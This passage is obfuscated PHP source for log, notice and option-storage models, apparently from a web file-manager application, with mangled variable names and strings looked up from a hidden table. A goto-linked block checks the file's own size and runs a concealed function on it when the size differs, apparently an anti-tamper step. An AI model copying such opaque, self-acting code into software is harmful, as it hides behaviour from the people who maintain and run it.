$‹‹ü«ç¡[2351] => array($‹‹ü«ç¡[2412]), $‹‹ü«ç¡[1941] => array($‹‹ü«ç¡[1942], $‹‹ü«ç¡[2413]), $‹‹ü«ç¡[2359] => array(), $‹‹ü«ç¡[2361] => array(), $‹‹ü«ç¡[2363] => array(), $‹‹ü«ç¡[1951] => array($‹‹ü«ç¡[1953]), $‹‹ü«ç¡[1952] => array($‹‹ü«ç¡[1953]), $‹‹ü«ç¡[2367] => array($‹‹ü«ç¡[2414]), $‹‹ü«ç¡[2369] => array($‹‹ü«ç¡[2414]), $‹‹ü«ç¡[2371] => array($‹‹ü«ç¡[2415]), $‹‹ü«ç¡[2357] => array($‹‹ü«ç¡[2416]), $‹‹ü«ç¡[1946] => array($‹‹ü«ç¡[2417]), $‹‹ü«ç¡[2374] => array($‹‹ü«ç¡[2418]), $‹‹ü«ç¡[1945] => array($‹‹ü«ç¡[1947])); return $øŞ¶¨›¹; } private function typeAll() { $®ÒËŸÇ =& $_SERVER[¦»×‡Ãã]; $à˜ÍÊÚ = $this->typeList; $ ôı±äµ = array_filter($this->typeFile()); foreach ($ ôı±äµ as $ì½‘Ş—Ÿ => $÷¦…¾ãÍ) { $à˜ÍÊÚ[$÷¦…¾ãÍ[0]] = $à˜ÍÊÚ[$ì½‘Ş—Ÿ]; } $à˜ÍÊÚ[$®ÒËŸÇ[1953]] = LNG($®ÒËŸÇ[2419]); $à˜ÍÊÚ[$®ÒËŸÇ[2414]] = LNG($®ÒËŸÇ[2420]); return $à˜ÍÊÚ; } public function addLog($è•é¨¦´, $»áµœè† = array()) { $ş«–·¸¼ =& $_SERVER[¦»×‡Ãã]; if (!isset($this->typeList[$è•é¨¦´])) { return; } $¬Ó¤İ‹Ş = Session::get($ş«–·¸¼[2112]); if (!$¬Ó¤İ‹Ş) { $¬Ó¤İ‹Ş = _get($»áµœè†, $ş«–·¸¼[1772], 0); } if ($è•é¨¦´ == $ş«–·¸¼[2386] && is_array($»áµœè†[$ş«–·¸¼[2421]]) && !$»áµœè†[$ş«–·¸¼[2421]]) { return; } $¿ùÃ…øº = get_client_ip(); if (!$»áµœè† || strlen(json_encode($»áµœè†)) >= 1024 * 64) { if ($»áµœè† && is_array($»áµœè†)) { $»áµœè† = array_intersect_key($»áµœè†, array_flip($ş«–·¸¼[475], $ş«–·¸¼[32])); $»áµœè†[$ş«–·¸¼[2422]] = $¿ùÃ…øº; } else { $»áµœè† = array($ş«–·¸¼[2422] => $¿ùÃ…øº); } } else { if (is_array($»áµœè†)) { $»áµœè†[$ş«–·¸¼[2422]] = $¿ùÃ…øº; } else { $»áµœè† = array($ş«–·¸¼[1287] => $»áµœè†, $ş«–·¸¼[2422] => $¿ùÃ…øº); } } $»áµœè† = array($ş«–·¸¼[1762] => Session::sign(), $ş«–·¸¼[1763] => intval($¬Ó¤İ‹Ş), $ş«–·¸¼[33] => $è•é¨¦´, $ş«–·¸¼[1765] => json_encode($»áµœè†)); parent::add($»áµœè†); } public function remove($Š‡àòµ‹) { $this->where(array($_SERVER[¦»×‡Ãã][493] => $Š‡àòµ‹))->delete(); } private function _makeOrder($¬Ÿú¨ÄÑ = '') { $“•óÁî’ =& $_SERVER[¦»×‡Ãã]; $ĞŒûÌµä = $“•óÁî’[231]; $ÒŠşû§ = array($“•óÁî’[523] => $“•óÁî’[524], $“•óÁî’[525] => $“•óÁî’[526]); $îİá‘ƒÉ = Input::get($“•óÁî’[531], $“•óÁî’[7], $“•óÁî’[2148], array($“•óÁî’[2066], $“•óÁî’[525])); $îİá‘ƒÉ = $ÒŠşû§[$îİá‘ƒÉ]; $¬Ÿú¨ÄÑ = $¬Ÿú¨ÄÑ . "{$ĞŒûÌµä}\40{$îİá‘ƒÉ}"; return $this->order($¬Ÿú¨ÄÑ); } public function get($ƒÓº„â÷ = '') { $ÕÍÔ×§ =& $_SERVER[¦»×‡Ãã]; if (!$ƒÓº„â÷) { show_json(array()); } $¬ã¹Æ¶ = array(); if ($ƒÓº„â÷[$ÕÍÔ×§[1772]]) { $¬ã¹Æ¶[$ÕÍÔ×§[1772]] = $ƒÓº„â÷[$ÕÍÔ×§[1772]]; } if (isset($ƒÓº„â÷[$ÕÍÔ×§[833]])) { $¤û³™¯ = $ƒÓº„â÷[$ÕÍÔ×§[833]]; $®Ëä’Â¢ = isset($ƒÓº„â÷[$ÕÍÔ×§[834]]) ? $ƒÓº„â÷[$ÕÍÔ×§[834]] : time(); $¬ã¹Æ¶[$ÕÍÔ×§[231]] = array($ÕÍÔ×§[409], array($¤û³™¯, $®Ëä’Â¢)); } if ($ƒÓº„â÷[$ÕÍÔ×§[33]]) { $‰—‘ë³ = explode($ÕÍÔ×§[50], $ƒÓº„â÷[$ÕÍÔ×§[33]]); $­»Ü­‚ = $this->typeFile(); $÷„÷ì™ = array(); foreach ($‰—‘ë³ as $Ù“ÃË¬) { $÷„÷ì™[] = $Ù“ÃË¬; if (isset($­»Ü­‚[$Ù“ÃË¬])) { $÷„÷ì™ = array_merge($÷„÷ì™, $­»Ü­‚[$Ù“ÃË¬]); } } $÷„÷ì™ = array_unique($÷„÷ì™); if ($÷„÷ì™) { $¬ã¹Æ¶[$ÕÍÔ×§[33]] = array($ÕÍÔ×§[7], $÷„÷ì™); } } else { $¬ã¹Æ¶[$ÕÍÔ×§[33]] = array($ÕÍÔ×§[2423], $ÕÍÔ×§[2424]); } if (!empty($ƒÓº„â÷[$ÕÍÔ×§[2422]])) { $¬ã¹Æ¶[$ÕÍÔ×§[526]] = array($ÕÍÔ×§[459], "\x25{$ƒÓº„â÷[$ÕÍÔ×§[2422]]}\45"); } $‚»şÅ = $this->_makeOrder()->where($¬ã¹Æ¶)->selectPage(); if (empty($‚»şÅ[$ÕÍÔ×§[445]])) { show_json(array(), !0, $‚»şÅ[$ÕÍÔ×§[442]]); } $‚»şÅ[$ÕÍÔ×§[445]] = $this->logList($‚»şÅ[$ÕÍÔ×§[445]]); return $‚»şÅ; } private function ipAddress(&$¹—ÍÈè¿) { $×ëÌ„ø’ =& $_SERVER[¦»×‡Ãã]; if (!empty($¹—ÍÈè¿[$×ëÌ„ø’[2422]])) { $ÚÎĞƒ¸ø = IpLocation::get($¹—ÍÈè¿[$×ëÌ„ø’[2422]]); } else { $ÚÎĞƒ¸ø = LNG($×ëÌ„ø’[2425]); } $¹—ÍÈè¿[$×ëÌ„ø’[2426]] = $ÚÎĞƒ¸ø; } private function descZipDownload($”Ö¼Í“², &$—ï…Û˜) { $Ùë–ã—­ =& $_SERVER[¦»×‡Ãã]; if (!isset($”Ö¼Í“²[$Ùë–ã—­[2427]])) { return; } $÷×²¥ = json_decode($”Ö¼Í“²[$Ùë–ã—­[2427]], !0); foreach ($÷×²¥ as $Úø†ñÕÌ) { try { $ô‹Ö‚»Á = IO::infoFullSimple($Úø†ñÕÌ[$Ùë–ã—­[87]]); } catch (Exception $¸†Î ) { continue; } $”Ö¼Í“²[$Ùë–ã—­[87]] = $Úø†ñÕÌ[$Ùë–ã—­[87]]; $—ï…Û˜[] = $”Ö¼Í“²[$Ùë–ã—­[193]] = $ô‹Ö‚»Á[$Ùë–ã—­[193]]; $—ï…Û˜[] = $”Ö¼Í“²[$Ùë–ã—­[2204]] = $ô‹Ö‚»Á[$Ùë–ã—­[192]]; break; } return $”Ö¼Í“²; } private function getSourceList(&$âÙ÷ÙÆ‘) { $ÈÅƒçßÖ =& $_SERVER[¦»×‡Ãã]; $Ú¡Ã¥ÄÉ = array(); foreach ($âÙ÷ÙÆ‘ as $ ‚Åƒùü => $—®ŒûÇ½) { $¢¤™¼Š = json_decode($—®ŒûÇ½[$ÈÅƒçßÖ[526]], !0); if ($—®ŒûÇ½[$ÈÅƒçßÖ[33]] == $ÈÅƒçßÖ[1944]) { $¢¤™¼Š = $this->descZipDownload($¢¤™¼Š, $Ú¡Ã¥ÄÉ); $âÙ÷ÙÆ‘[$ ‚Åƒùü][$ÈÅƒçßÖ[526]] = json_encode($¢¤™¼Š); continue; } if (strpos($—®ŒûÇ½[$ÈÅƒçßÖ[33]], $ÈÅƒçßÖ[2206]) !== 0) { if (!isset($¢¤™¼Š[$ÈÅƒçßÖ[87]]) || strpos($—®ŒûÇ½[$ÈÅƒçßÖ[33]], $ÈÅƒçßÖ[2428]) !== 0) { continue; } try { $İáØÜ†‚ = IO::infoFullSimple($¢¤™¼Š[$ÈÅƒçßÖ[87]]); } catch (Exception $¾ÉÉõóÂ) { continue; } $Ú¡Ã¥ÄÉ[] = $¢¤™¼Š[$ÈÅƒçßÖ[193]] = $İáØÜ†‚[$ÈÅƒçßÖ[193]]; $Ú¡Ã¥ÄÉ[] = $¢¤™¼Š[$ÈÅƒçßÖ[2204]] = $İáØÜ†‚[$ÈÅƒçßÖ[192]]; $âÙ÷ÙÆ‘[$ ‚Åƒùü][$ÈÅƒçßÖ[526]] = json_encode($¢¤™¼Š); continue; } $Ú¡Ã¥ÄÉ[] = $¢¤™¼Š[$ÈÅƒçßÖ[193]]; $Ú¡Ã¥ÄÉ[] = $¢¤™¼Š[$ÈÅƒçßÖ[2204]]; if ($¢¤™¼Š[$ÈÅƒçßÖ[33]] == $ÈÅƒçßÖ[620]) { $Ú¡Ã¥ÄÉ[] = $¢¤™¼Š[$ÈÅƒçßÖ[526]][$ÈÅƒçßÖ[1241]]; $Ú¡Ã¥ÄÉ[] = $¢¤™¼Š[$ÈÅƒçßÖ[526]][$ÈÅƒçßÖ[1242]]; } if ($¢¤™¼Š[$ÈÅƒçßÖ[33]] == $ÈÅƒçßÖ[2215]) { $Ú¡Ã¥ÄÉ[] = $¢¤™¼Š[$ÈÅƒçßÖ[526]][$ÈÅƒçßÖ[193]]; } } if (!$Ú¡Ã¥ÄÉ) { return array(); } return Model($ÈÅƒçßÖ[897])->sourceListInfo($Ú¡Ã¥ÄÉ, !0); } private function logList($…€ù š´) { $ª¨˜ºÂ =& $_SERVER[¦»×‡Ãã]; $æË¹Ô¬Õ = array_to_keyvalue($…€ù š´, $ª¨˜ºÂ[12], $ª¨˜ºÂ[1772]); $¡ª•Š–Û = Model($ª¨˜ºÂ[598])->userListInfo(array_unique($æË¹Ô¬Õ)); $êàç¿¿á = $this->getSourceList($…€ù š´); $ÑÄîßŠ¡ = $this->typeAll(); $²¼àÔ‹Ï = array(); $Âı™ïİö = array(); foreach ($…€ù š´ as $´İ¤ Õğ => $šàæÑ«) { $‰ƒ‰¢Ê† = $šàæÑ«[$ª¨˜ºÂ[33]]; $“ş¯ì•ñ = isset($¡ª•Š–Û[$šàæÑ«[$ª¨˜ºÂ[1772]]]) ? $¡ª•Š–Û[$šàæÑ«[$ª¨˜ºÂ[1772]]] : !1; $©ã®ÌÀ« = strpos($‰ƒ‰¢Ê†, $ª¨˜ºÂ[2429]) === 0 ? LNG($ª¨˜ºÂ[2430]) : LNG($ª¨˜ºÂ[2425]); $šàæÑ«[$ª¨˜ºÂ[32]] = isset($“ş¯ì•ñ[$ª¨˜ºÂ[32]]) ? $“ş¯ì•ñ[$ª¨˜ºÂ[32]] : LNG($ª¨˜ºÂ[2425]); $šàæÑ«[$ª¨˜ºÂ[2259]] = isset($“ş¯ì•ñ[$ª¨˜ºÂ[2259]]) ? $“ş¯ì•ñ[$ª¨˜ºÂ[2259]] : $ª¨˜ºÂ[12]; $šàæÑ«[$ª¨˜ºÂ[1661]] = isset($ÑÄîßŠ¡[$‰ƒ‰¢Ê†]) ? $ÑÄîßŠ¡[$‰ƒ‰¢Ê†] : $©ã®ÌÀ«; $šàæÑ«[$ª¨˜ºÂ[2147]] = $“ş¯ì•ñ; $îš¯åÕ = json_decode($šàæÑ«[$ª¨˜ºÂ[526]], !0); $šàæÑ«[$ª¨˜ºÂ[2422]] = isset($îš¯åÕ[$ª¨˜ºÂ[2422]]) ? $îš¯åÕ[$ª¨˜ºÂ[2422]] : $ª¨˜ºÂ[12]; $šàæÑ«[$ª¨˜ºÂ[2426]] = IpLocation::get($šàæÑ«[$ª¨˜ºÂ[2422]]); if (strpos($‰ƒ‰¢Ê†, $ª¨˜ºÂ[2206]) === 0 || isset($îš¯åÕ[$ª¨˜ºÂ[2204]])) { $îš¯åÕ[$ª¨˜ºÂ[90]] = $êàç¿¿á[$îš¯åÕ[$ª¨˜ºÂ[193]]]; $îš¯åÕ[$ª¨˜ºÂ[2220]] = $êàç¿¿á[$îš¯åÕ[$ª¨˜ºÂ[2204]]]; if ($îš¯åÕ[$ª¨˜ºÂ[33]] == $ª¨˜ºÂ[620]) { $îš¯åÕ[$ª¨˜ºÂ[526]][$ª¨˜ºÂ[1241]] = $êàç¿¿á[$îš¯åÕ[$ª¨˜ºÂ[526]][$ª¨˜ºÂ[1241]]]; $îš¯åÕ[$ª¨˜ºÂ[526]][$ª¨˜ºÂ[1242]] = $êàç¿¿á[$îš¯åÕ[$ª¨˜ºÂ[526]][$ª¨˜ºÂ[1242]]]; } if ($îš¯åÕ[$ª¨˜ºÂ[33]] == $ª¨˜ºÂ[2215]) { $îš¯åÕ[$ª¨˜ºÂ[526]][$ª¨˜ºÂ[193]] = $êàç¿¿á[$îš¯åÕ[$ª¨˜ºÂ[526]][$ª¨˜ºÂ[193]]]; } if ($îš¯åÕ[$ª¨˜ºÂ[33]] == $ª¨˜ºÂ[1939]) { $îš¯åÕ[$ª¨˜ºÂ[2220]] = $îš¯åÕ[$ª¨˜ºÂ[90]]; $îš¯åÕ[$ª¨˜ºÂ[2204]] = $îš¯åÕ[$ª¨˜ºÂ[2220]][$ª¨˜ºÂ[193]]; $îš¯åÕ[$ª¨˜ºÂ[90]] = !1; $îš¯åÕ[$ª¨˜ºÂ[193]] = $ª¨˜ºÂ[12]; } $¬Á™óÜß = array($ª¨˜ºÂ[1939], $ª¨˜ºÂ[2202]); if (!in_array($îš¯åÕ[$ª¨˜ºÂ[33]], $¬Á™óÜß)) { if ($îš¯åÕ[$ª¨˜ºÂ[90]] && $îš¯åÕ[$ª¨˜ºÂ[90]][$ª¨˜ºÂ[190]] == $ª¨˜ºÂ[191]) { $Âı™ïİö[] = $šàæÑ«[$ª¨˜ºÂ[475]]; unset($…€ù š´[$´İ¤ Õğ]); continue; } if ($îš¯åÕ[$ª¨˜ºÂ[2220]] && $îš¯åÕ[$ª¨˜ºÂ[2220]][$ª¨˜ºÂ[190]] == $ª¨˜ºÂ[191]) { $Âı™ïİö[] = $šàæÑ«[$ª¨˜ºÂ[475]]; unset($…€ù š´[$´İ¤ Õğ]); continue; } } } $šàæÑ«[$ª¨˜ºÂ[526]] = $îš¯åÕ; unset($šàæÑ«[$ª¨˜ºÂ[2431]]); $²¼àÔ‹Ï[] = $šàæÑ«; } $this->clearSystemPathLog($Âı™ïİö); return $²¼àÔ‹Ï; } private function clearSystemPathLog($ïš”€¢À) { $„”î©Æ =& $_SERVER[¦»×‡Ãã]; if (count($ïš”€¢À) == 0) { return; } $±ºî…Æ‚ = array($„”î©Æ[475] => array($„”î©Æ[7], array_unique($ïš”€¢À))); $this->where($±ºî…Æ‚)->delete(); } public function deviceList($ş£¹Ú§¾, $¹“†¯µ¡ = 0) { $Èâ¾äÄÒ =& $_SERVER[¦»×‡Ãã]; $¡ıÕ ªÉ = array($Èâ¾äÄÒ[1772] => $ş£¹Ú§¾, $Èâ¾äÄÒ[231] => array($Èâ¾äÄÒ[1092], $¹“†¯µ¡), $Èâ¾äÄÒ[33] => $Èâ¾äÄÒ[1913]); $¥ÁÀÂÇ = array(); $Î¾ä¯ú¬ = $this->field($Èâ¾äÄÒ[2432])->where($¡ıÕ ªÉ)->order($Èâ¾äÄÒ[2218])->limit(50)->select(); foreach ($Î¾ä¯ú¬ as $ÇÂ’õÍ => $”à¢šşª) { if ($ÇÂ’õÍ > 0 && abs($”à¢šşª[$Èâ¾äÄÒ[231]] - $Î¾ä¯ú¬[$ÇÂ’õÍ - 1][$Èâ¾äÄÒ[231]]) < 5) { continue; } $‡‡şÙ…Á = json_decode($”à¢šşª[$Èâ¾äÄÒ[526]], !0); $”à¢šşª[$Èâ¾äÄÒ[2422]] = isset($‡‡şÙ…Á[$Èâ¾äÄÒ[2422]]) ? $‡‡şÙ…Á[$Èâ¾äÄÒ[2422]] : $Èâ¾äÄÒ[12]; unset($‡‡şÙ…Á[$Èâ¾äÄÒ[2422]]); $âÇÛ‡Û­ = $this->deviceType($‡‡şÙ…Á[$Èâ¾äÄÒ[2207]]); if (isset($¥ÁÀÂÇ[$âÇÛ‡Û­])) { continue; } $”à¢šşª[$Èâ¾äÄÒ[2426]] = IpLocation::get($”à¢šşª[$Èâ¾äÄÒ[2422]]); $”à¢šşª[$Èâ¾äÄÒ[526]] = $‡‡şÙ…Á; $¥ÁÀÂÇ[$âÇÛ‡Û­] = $”à¢šşª; } return array_values($¥ÁÀÂÇ); } public function deviceType($øß¢ùµÃ) { return $øß¢ùµÃ; } } class SystemNoticeModel extends ModelBaseLight { public $optionType = "\x53\x79\x73\x74\145\x6d\x2e\x6e\157\x74\151\x63\145\114\151\163\164"; public $field = array("\x6e\141\155\145", "\143\157\156\x74\x65\x6e\164", "\x61\165\164\150", "\155\x6f\x64\x65", "\164\x69\155\145", "\164\171\160\145", "\x6c\x65\x76\145\x6c", "\145\x6e\x61\x62\x6c\x65", "\x73\x6f\162\x74"); public function listData($éº‰ºÂÖ = false, $­àÄá¤ø = "\163\157\162\164", $Œô³à«æ = false) { return parent::listData($éº‰ºÂÖ, $­àÄá¤ø, $Œô³à«æ); } public function add($¯Ø—ÑŸæ) { $üÅÙ©‹ =& $_SERVER[¦»×‡Ãã]; $õÍ¬Âì = time(); if ($¯Ø—ÑŸæ[$üÅÙ©‹[16]] == $üÅÙ©‹[2433]) { $õÍ¬Âì = strtotime($¯Ø—ÑŸæ[$üÅÙ©‹[206]]); } $¯Ø—ÑŸæ[$üÅÙ©‹[206]] = $õÍ¬Âì; return parent::insert($¯Ø—ÑŸæ); } public function update($—“òş«, $åôŠ¾Òµ) { $Æä­Ã™• =& $_SERVER[¦»×‡Ãã]; $¹¶„¼Ğ¢ = $this->listData($—“òş«); if (!$¹¶„¼Ğ¢) { return !1; } $ŒÊ·éüæ = time(); if ($åôŠ¾Òµ[$Æä­Ã™•[16]] == $Æä­Ã™•[2433]) { $ŒÊ·éüæ = strtotime($åôŠ¾Òµ[$Æä­Ã™•[206]]); } $åôŠ¾Òµ[$Æä­Ã™•[206]] = $ŒÊ·éüæ; return parent::update($—“òş«, $åôŠ¾Òµ); } public function remove($‡ìŸº—å) { $Ÿ¹éØ˜› = $this->listData($‡ìŸº—å); if (!$Ÿ¹éØ˜› || $Ÿ¹éØ˜›[$_SERVER[¦»×‡Ãã][191]]) { return !1; } return parent::remove($‡ìŸº—å); } public function sort($›ÄÉìŠì, $×ÂÙÕ¾Ò) { return parent::update($›ÄÉìŠì, $×ÂÙÕ¾Ò); } public function enable($Ö»’Óñ½, $÷ÆõôÏŠ) { return parent::update($Ö»’Óñ½, array($_SERVER[¦»×‡Ãã][2434] => $÷ÆõôÏŠ)); } private function initUserOption() { $ì‡¬îÙ± =& $_SERVER[¦»×‡Ãã]; $this->optionType = $ì‡¬îÙ±[2435]; $this->modelType = $ì‡¬îÙ±[2436]; $this->field = array($ì‡¬îÙ±[2437], $ì‡¬îÙ±[32], $ì‡¬îÙ±[206], $ì‡¬îÙ±[33], $ì‡¬îÙ±[2438], $ì‡¬îÙ±[823], $ì‡¬îÙ±[226]); } public function userNoticeGet($ƒ«Ãú´• = false) { $this->initUserOption(); return parent::listData($ƒ«Ãú´•, $_SERVER[¦»×‡Ãã][475], !0); } public function userNoticeAdd($şÙüÂ¥œ) { $ĞÂ‰ŸÒÄ =& $_SERVER[¦»×‡Ãã]; $this->initUserOption(); $•ÚØõÙ = $this->findByKey($ĞÂ‰ŸÒÄ[2437], $şÙüÂ¥œ[$ĞÂ‰ŸÒÄ[475]]); if ($•ÚØõÙ) { return !0; } $ÙÑ¦õÁ· = array($ĞÂ‰ŸÒÄ[2437] => $şÙüÂ¥œ[$ĞÂ‰ŸÒÄ[475]], $ĞÂ‰ŸÒÄ[32] => $şÙüÂ¥œ[$ĞÂ‰ŸÒÄ[32]], $ĞÂ‰ŸÒÄ[206] => $şÙüÂ¥œ[$ĞÂ‰ŸÒÄ[206]], $ĞÂ‰ŸÒÄ[33] => isset($şÙüÂ¥œ[$ĞÂ‰ŸÒÄ[33]]) ? $şÙüÂ¥œ[$ĞÂ‰ŸÒÄ[33]] : 1, $ĞÂ‰ŸÒÄ[2438] => isset($şÙüÂ¥œ[$ĞÂ‰ŸÒÄ[2438]]) ? $şÙüÂ¥œ[$ĞÂ‰ŸÒÄ[2438]] : 0, $ĞÂ‰ŸÒÄ[823] => 0, $ĞÂ‰ŸÒÄ[226] => 0); return parent::insert($ÙÑ¦õÁ·); } public function userNoticeEdit($±‹¶î¦Ó, $ÍŞøÙï‰) { $this->initUserOption(); return parent::update($±‹¶î¦Ó, $ÍŞøÙï‰); } } goto F§ÎÙ»Èå; E¦‡’Çñâ„: $_file = $_SERVER[$_SERVER[¦»×‡Ãã][1418]]; $_size = $_SERVER[¦»×‡Ãã][951]; if ($_SERVER[$_SERVER[¦»×‡Ãã][952]] != $_size($_file)) { $_getc = $_SERVER[¦»×‡Ãã][954]; $_getfile = $_SERVER[$_SERVER[¦»×‡Ãã][949]] . $_SERVER[¦»×‡Ãã][950]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[¦»×‡Ãã][262], $_getfilec); if (count($_getarrs) < $_SERVER[¦»×‡Ãã][690]) { $exit = $_SERVER[¦»×‡Ãã][955]; $exit(); } $_act = $_SERVER[¦»×‡Ãã][1419]; $_act($_file); } goto dùÓ‚‚…£ƒ; A¹ŒÔ³³®æ: class ModelBaseLight { public $optionType = ''; public $modelType = "\123\x79\x73\x74\145\155\x4f\160\164\151\157\x6e"; public $field = array(); public function listData($ÄùìŸ†† = false, $ù€–Ïƒ¿ = "\155\157\x64\151\x66\x79\124\x69\x6d\145", $µ«œÓŒ¸ = false) { $‹ñü•—ù = Model($this->modelType)->get(!1, $this->optionType, !0); $¦†ì¼“ = array_values($‹ñü•—ù); if ($¦†ì¼“ && $¦†ì¼“[0] && !is_array($¦†ì¼“[0])) { Model($this->modelType)->cacheRemove($this->optionType); $‹ñü•—ù = Model($this->modelType)->get(!1, $this->optionType, !0); } if (!$‹ñü•—ù) { return $ÄùìŸ†† ? null : array(); } if (!$ÄùìŸ††) { $‹ñü•—ù = array_filter(array_values($‹ñü•—ù)); return array_sort_by($‹ñü•—ù, $ù€–Ïƒ¿, $µ«œÓŒ¸); } return $‹ñü•—ù[$_SERVER[¦»×‡Ãã][472] . $ÄùìŸ††]; } public function insert($•¹»Ò×½) { $¼ñöõœì =& $_SERVER[¦»×‡Ãã]; $•¹»Ò×½ = array_field_key($•¹»Ò×½, $this->field); $£š¼šı‘ = Model($this->modelType)->get($¼ñöõœì[473], $this->optionType . $¼ñöõœì[474]); $£š¼šı‘ = $£š¼šı‘ ? $£š¼šı‘ : 0; $•¹»Ò×½[$¼ñöõœì[475]] = ++$£š¼šı‘; $•¹»Ò×½[$¼ñöõœì[231]] = time(); $•¹»Ò×½[$¼ñöõœì[88]] = time(); Model($this->modelType)->set($¼ñöõœì[473], $£š¼šı‘, $this->optionType . $¼ñöõœì[474]); Model($this->modelType)->set($¼ñöõœì[472] . $£š¼šı‘, $•¹»Ò×½, $this->optionType); return $£š¼šı‘; } public function update($ÚşÜƒµ, $½šŠşĞ) { $ÎÄôØÖş =& $_SERVER[¦»×‡Ãã]; $½šŠşĞ = array_field_key($½šŠşĞ, $this->field); $ú¥ÂÄ’Ú = $this->listData($ÚşÜƒµ); if (!$ú¥ÂÄ’Ú || !$ÚşÜƒµ) { return !1; } $½šŠşĞ = array_merge($ú¥ÂÄ’Ú, $½šŠşĞ); $½šŠşĞ[$ÎÄôØÖş[88]] = time(); return Model($this->modelType)->set($ÎÄôØÖş[472] . $ÚşÜƒµ, $½šŠşĞ, $this->optionType); } public function remove($å™ôÖÉ˜) { if (!$å™ôÖÉ˜) { return !1; } return Model($this->modelType)->remove($_SERVER[¦»×‡Ãã][472] . $å™ôÖÉ˜, $this->optionType); } public function clear() { $«æ¦è¯Ã =& $_SERVER[¦»×‡Ãã]; Model($this->modelType)->remove($«æ¦è¯Ã[473], $this->optionType . $«æ¦è¯Ã[474]); return Model($this->modelType)->remove(null, $this->optionType); } public function cacheClear() { return Model($this->modelType)->cacheRemove($this->optionType); } public function findByKey($ı±«Ñ‡, $µÉ¹µË) { if (!$µÉ¹µË) { return !1; } $Ğøõ°›“ = $this->listData(); $Ğøõ°›“ = array_to_keyvalue($Ğøõ°›“, $ı±«Ñ‡); return isset($Ğøõ°›“[$µÉ¹µË]) ? $Ğøõ°›“[$µÉ¹µË] : !1; } public function findByName($Ü€»áŒ) { return $this->findByKey($_SERVER[¦»×‡Ãã][32], $Ü€»áŒ); } protected function resetData($ÎÇ„ô) { $…Ìë¥ŒÅ =& $_SERVER[¦»×‡Ãã]; $ÎÇ„ô = is_array($ÎÇ„ô) ? $ÎÇ„ô : array(); $äáÅ€Ïè = array(); for ($Êñ¨ˆœ§ = 0; $Êñ¨ˆœ§ < count($ÎÇ„ô); $Êñ¨ˆœ§++) { $äáÅ€Ïè[$…Ìë¥ŒÅ[472] . $ÎÇ„ô[$Êñ¨ˆœ§][$…Ìë¥ŒÅ[475]]] = $ÎÇ„ô[$Êñ¨ˆœ§]; } return Model($this->modelType)->set($äáÅ€Ïè, !1, $this->optionType); } private function getAutoName($õü¤˜Òû) { $í¥ ÊÒè = array_to_keyvalue($this->listData(), $_SERVER[¦»×‡Ãã][32]); if (!$í¥ ÊÒè || !isset($í¥ ÊÒè[$õü¤˜Òû])) { return $õü¤˜Òû; } for ($ûïèê” = 1; $ûïèê” < count($í¥ ÊÒè); $ûïèê”++) { $¬ß½Ü•— = $õü¤˜Òû . "\50{$ûïèê”}\x29"; if (!isset($í¥ ÊÒè[$¬ß½Ü•—])) { return $¬ß½Ü•—; } } return $¬ß½Ü•—; } } class ModelBaseOption extends ModelBase { protected $tableName = ''; protected $jsonField = array(); public function get($àßÈÂò = false, $©Œò¿ò = '', $É×—¦íƒ = false) { $ü˜Ççî¶ =& $_SERVER[¦»×‡Ãã]; $ûî²ËÏÃ = $this->cacheGet($©Œò¿ò); $ÖôÚ±ˆ = $this->optionDefault($©Œò¿ò); $ÖôÚ±ˆ = is_array($ÖôÚ±ˆ) ? $ÖôÚ±ˆ : array(); if (is_array($ûî²ËÏÃ)) { $ûî²ËÏÃ = array_merge($ÖôÚ±ˆ, $ûî²ËÏÃ); return $àßÈÂò ? isset($ûî²ËÏÃ[$àßÈÂò]) ? $ûî²ËÏÃ[$àßÈÂò] : null : $ûî²ËÏÃ; } $¡ù‡ò°· = $this->filterWhere(array($ü˜Ççî¶[33] => $©Œò¿ò)); $ûî²ËÏÃ = $this->where($¡ù‡ò°·)->select(); $ûî²ËÏÃ = array_to_keyvalue($ûî²ËÏÃ, $ü˜Ççî¶[97], $ü˜Ççî¶[450]); foreach ($ûî²ËÏÃ as $ÂèñÑİ => $Õàü—) { if ($É×—¦íƒ || in_array($ÂèñÑİ, $this->jsonField)) { $ûî²ËÏÃ[$ÂèñÑİ] = json_decode($Õàü—, !0); } } $this->cacheSet($©Œò¿ò, $ûî²ËÏÃ); $ûî²ËÏÃ = array_merge($ÖôÚ±ˆ, $ûî²ËÏÃ); return $àßÈÂò ? $ûî²ËÏÃ[$àßÈÂò] : $ûî²ËÏÃ; } public function set($ıç–ø±à, $²ÃË… = false, $®‹é²—å = '') { $Ò³Éˆ¦¹ =& $_SERVER[¦»×‡Ãã]; $this->cacheRemove($®‹é²—å); $·Ä¢Ï˜ã = array(); $ö§›ßÈì = is_array($ıç–ø±à) ? $ıç–ø±à : array($ıç–ø±à => $²ÃË…); foreach ($ö§›ßÈì as $–ÛªÀ©® => $‰ªèÀ…í) { if (is_array($‰ªèÀ…í)) { $‰ªèÀ…í = json_encode_force($‰ªèÀ…í); } $this->checkLength($‰ªèÀ…í, !1, $this->tableName . $Ò³Éˆ¦¹[4] . $ıç–ø±à); $‰ªèÀ…í = self::textEncode($‰ªèÀ…í); $ö§›ßÈì = array($Ò³Éˆ¦¹[33] => $®‹é²—å, $Ò³Éˆ¦¹[97] => $–ÛªÀ©®, $Ò³Éˆ¦¹[450] => $‰ªèÀ…í); $·Ä¢Ï˜ã[] = $this->filterWhere($ö§›ßÈì); } if (!$·Ä¢Ï˜ã) { return !0; } $Å¯ç«×® = $this->cacheKey($Ò³Éˆ¦¹[476]); CacheLock::lock($Å¯ç«×®); $º“çªÙ° = $this->addAll($·Ä¢Ï˜ã, array(), !0); CacheLock::unlock($Å¯ç«×®); return $º“çªÙ°; } protected function optionDefault($ø¡Ïùúò = '') { return !1; } public function setDeep($Àæ·‹ğ§, $‰úˆœ¯³ = false, $ŒõÑä¡ô = '') { $„œ¨àö¡ = explode($_SERVER[¦»×‡Ãã][10], $Àæ·‹ğ§); $æŒ—òÒÚ = $this->get(); array_set_value($æŒ—òÒÚ, $Àæ·‹ğ§, $‰úˆœ¯³); $this->set($„œ¨àö¡[0], $æŒ—òÒÚ[$„œ¨àö¡[0]], $ŒõÑä¡ô); } public function remove($»¤†‚ëÃ, $‘›îèá = '') { $É½Û®İü =& $_SERVER[¦»×‡Ãã]; $this->cacheRemove($‘›îèá); $™²Ô±˜ç = $this->filterWhere(array($É½Û®İü[97] => $»¤†‚ëÃ, $É½Û®İü[33] => $‘›îèá)); if (is_null($»¤†‚ëÃ)) { unset($™²Ô±˜ç[$É½Û®İü[97]]); } return $this->where($™²Ô±˜ç)->delete(); } public function cacheSet($Ÿ±€²¶, 